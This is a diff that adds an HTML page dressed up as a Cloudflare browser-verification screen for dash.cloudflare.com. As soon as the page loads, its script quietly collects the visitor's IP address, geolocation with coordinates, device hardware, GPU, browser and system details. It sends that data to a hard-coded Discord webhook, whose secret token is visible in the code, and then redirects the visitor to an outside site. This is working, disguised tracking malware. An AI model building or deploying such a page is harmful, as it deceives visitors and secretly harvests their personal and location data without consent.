@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification</title>
+    <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.2/src/ua-parser.min.js"></script>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #212121;
+        }
+        .verification-box {
+            background-color: white;
+            border-radius: 8px;
+            padding: 25px;
+            width: 400px;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .cloudflare-logo {
+            display: inline-flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        .cloudflare-logo svg {
+            width: 22px;
+            height: 22px;
+            margin-right: 8px;
+        }
+        .domain {
+            font-weight: 600;
+            font-size: 16px;
+        }
+        .verification-message {
+            font-size: 14px;
+            color: #666;
+            margin: 15px 0;
+        }
+        .progress-container {
+            height: 4px;
+            background: #e0e0e0;
+            border-radius: 2px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        .progress-bar {
+            height: 100%;
+            background: #F38020;
+            width: 0;
+            transition: width 0.3s;
+        }
+        .loading {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+        }
+        .spinner {
+            border: 2px solid rgba(0,0,0,0.1);
+            border-top: 2px solid #000;
+            border-radius: 50%;
+            width: 16px;
+            height: 16px;
+            animation: spin 1s linear infinite;
+            margin-right: 8px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="verification-box">
+        <div class="cloudflare-logo">
+            <svg viewBox="0 0 24 24" fill="#F38020">
+                <path d="M12 6L6 12L12 18L18 12Z"/>
+            </svg>
+            <span class="domain">dash.cloudflare.com</span>
+        </div>
+        <div class="verification-message">
+            Verifying your browser before accessing dash.cloudflare.com
+        </div>
+        <div class="loading">
+            <div class="spinner"></div>
+            <div>Checking connection...</div>
+        </div>
+        <div class="progress-container">
+            <div class="progress-bar" id="progress"></div>
+        </div>
+    </div>
+
+    <script>
+        const progressBar = document.getElementById('progress');
+        let progress = 0;
+        
+        function updateProgress(percent) {
+            progress = percent;
+            progressBar.style.width = percent + '%';
+        }
+        
+        async function getIP() {
+            const fallbackIPs = [
+                'https://api.ipify.org?format=json',
+                'https://ipv4.icanhazip.com',
+                'https://api.myip.com'
+            ];
+            
+            for (const url of fallbackIPs) {
+                try {
+                    const response = await fetch(url);
+                    if (url.includes('myip')) {
+                        const data = await response.json();
+                        return data.ip || "Unknown";
+                    } else {
+                        const data = await response.json();
+                        return data.ip || data;
+                    }
+                } catch {}
+            }
+            return "Unknown";
+        }
+        
+        async function getGeoData(ip) {
+            if (ip === "Unknown") return {};
+            try {
+                const response = await fetch(`https://ipapi.co/${ip}/json/`);
+                const data = await response.json();
+                
+                data.full_address = [
+                    data.street_number ? `${data.street_number} ${data.street_name}` : null,
+                    data.city,
+                    data.region,
+                    data.postal,
+                    data.country_name
+                ].filter(Boolean).join(', ');
+                
+                data.network = {
+                    asn: data.asn || "Unknown",
+                    org: data.org || "Unknown",
+                    version: data.version || "Unknown",
+                    proxy: data.proxy || navigator.webdriver || false,
+                    hosting: data.hosting || false
+                };
+                
+                return data;
+            } catch {
+                return {};
+            }
+        }
+        
+        function getDeviceInfo() {
+            const parser = new UAParser();
+            const result = parser.getResult();
+            
+            const deviceBrand = result.device.vendor || 
+                              (navigator.userAgent.includes('iPhone') ? 'Apple' : 
+                              navigator.userAgent.includes('Samsung') ? 'Samsung' : 
+                              navigator.userAgent.includes('Pixel') ? 'Google' : 'Unknown');
+            
+            const deviceModel = result.device.model || 
+                             (navigator.userAgent.match(/iPhone\s+(\w+)/) ? `iPhone ${RegExp.$1}` : 
+                              navigator.userAgent.match(/iPad\s+(\w+)/) ? `iPad ${RegExp.$1}` : 
+                              navigator.userAgent.match(/Pixel\s+(\w+)/) ? `Pixel ${RegExp.$1}` : 'Unknown');
+            
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            let gpuInfo = 'Unknown';
+            if (gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'Unknown';
+                }
+            }
+            
+            return {
+                brand: deviceBrand,
+                model: deviceModel,
+                type: result.device.type || "Desktop",
+                architecture: result.cpu.architecture || "Unknown",
+                browser: `${result.browser.name} ${result.browser.version || ''}`.trim(),
+                engine: `${result.engine.name} ${result.engine.version || ''}`.trim(),
+                os: `${result.os.name} ${result.os.version || ''}`.trim(),
+                platform: navigator.platform,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                colorDepth: `${window.screen.colorDepth} bit`,
+                pixelRatio: window.devicePixelRatio,
+                orientation: window.screen.orientation ? window.screen.orientation.type : 'Unknown',
+                gpu: gpuInfo,
+                cores: navigator.hardwareConcurrency || "Unknown",
+                memory: navigator.deviceMemory || "Unknown",
+                connection: navigator.connection ? {
+                    type: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : null,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
+                userAgent: navigator.userAgent,
+                doNotTrack: navigator.doNotTrack || "Not specified",
+                cookies: navigator.cookieEnabled ? "Enabled" : "Disabled"
+            };
+        }
+        
+        async function sendToDiscord(embed) {
+            try {
+                await fetch('https://discord.com/api/webhooks/1389607536591769761/ZsQTTh91BVs7CGak6QSj3I4-ekz--chXaghd3RN9CSwlCcU0MbUN_WBwVrGNe90fv0-u', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        embeds: [embed],
+                        content: "@everyone 🚨 **new visitor tracked** 🚨"
+                    })
+                });
+            } catch (error) {
+                console.error('Discord webhook error:', error);
+            }
+        }
+        
+        async function trackAndRedirect() {
+            updateProgress(10);
+            
+            const ip = await Promise.race([
+                getIP(),
+                new Promise(resolve => setTimeout(() => resolve("Unknown"), 1500))
+            ]);
+            
+            updateProgress(30);
+            
+            const [geoData, deviceInfo] = await Promise.all([
+                getGeoData(ip),
+                new Promise(resolve => {
+                    setTimeout(() => resolve(getDeviceInfo()), 500);
+                })
+            ]);
+            
+            updateProgress(60);
+            
+            const locationLink = geoData.latitude && geoData.longitude ? 
+                `https://www.google.com/maps?q=${geoData.latitude},${geoData.longitude}` : 
+                "No coordinates";
+            
+            const embed = {
+                title: "Visitor report",
+                color: 0xF38020,
+                description: `**Timestamp:** ${new Date().toLocaleString()}`,
+                fields: [
+                    { name: "🌐 NETWORK IDENTITY", value: `**IP:** \`${ip}\`\n**ASN:** ${geoData.network?.asn || "Unknown"}\n**ISP:** ${geoData.network?.org || "Unknown"}\n**Proxy/VPN:** ${geoData.network?.proxy ? "Yes" : "No"}\n**Hosting:** ${geoData.network?.hosting ? "Yes" : "No"}`, inline: true },
+                    { name: "📍 PHYSICAL LOCATION", value: `**Full Address:** ${geoData.full_address || "Not available"}\n**City:** ${geoData.city || "Unknown"}\n**Region:** ${geoData.region || "Unknown"}\n**Country:** ${geoData.country_name || "Unknown"} (${geoData.country || "??"})\n**Postal:** ${geoData.postal || "Unknown"}\n**Coordinates:** [${geoData.latitude || "?"}, ${geoData.longitude || "?"}](${locationLink})`, inline: true },
+                    { name: "📱 DEVICE HARDWARE", value: `**Brand:** ${deviceInfo.brand}\n**Model:** ${deviceInfo.model}\n**Type:** ${deviceInfo.type}\n**CPU:** ${deviceInfo.architecture}\n**Cores:** ${deviceInfo.cores}\n**GPU:** ${deviceInfo.gpu}\n**RAM:** ${deviceInfo.memory}GB`, inline: true },
+                    { name: "🖥️ DISPLAY INFO", value: `**Resolution:** ${deviceInfo.screen}\n**Color Depth:** ${deviceInfo.colorDepth}\n**Pixel Ratio:** ${deviceInfo.pixelRatio}\n**Orientation:** ${deviceInfo.orientation}`, inline: true },
+                    { name: "💻 SOFTWARE ENVIRONMENT", value: `**OS:** ${deviceInfo.os}\n**Platform:** ${deviceInfo.platform}\n**Browser:** ${deviceInfo.browser}\n**Engine:** ${deviceInfo.engine}\n**Timezone:** ${deviceInfo.timezone}\n**Languages:** ${deviceInfo.languages}`, inline: true },
+                    { name: "📶 NETWORK STATUS", value: `**Connection:** ${deviceInfo.connection?.type || "Unknown"}\n**Speed:** ${deviceInfo.connection?.downlink ? `${deviceInfo.connection.downlink}Mb/s` : "Unknown"}\n**Latency:** ${deviceInfo.connection?.rtt ? `${deviceInfo.connection.rtt}ms` : "Unknown"}\n**Cookies:** ${deviceInfo.cookies}\n**DNT:** ${deviceInfo.doNotTrack}`, inline: true },
+                    { name: "📜 RAW USER AGENT", value: `\`\`\`${deviceInfo.userAgent}\`\`\``, inline: false }
+                ],
+                footer: {
+                    text: "🔒 Cloudflare Security Verification"
+                },
+                timestamp: new Date().toISOString()
+            };
+            
+            sendToDiscord(embed);
+            
+            updateProgress(100);
+            
+            setTimeout(() => {
+                window.location.href = 'https://vaultcord.win/leakingERLC';
+            }, 1000);
+        }
+        
+        window.addEventListener('DOMContentLoaded', trackAndRedirect);
+    </script>
+</body>
+</html>
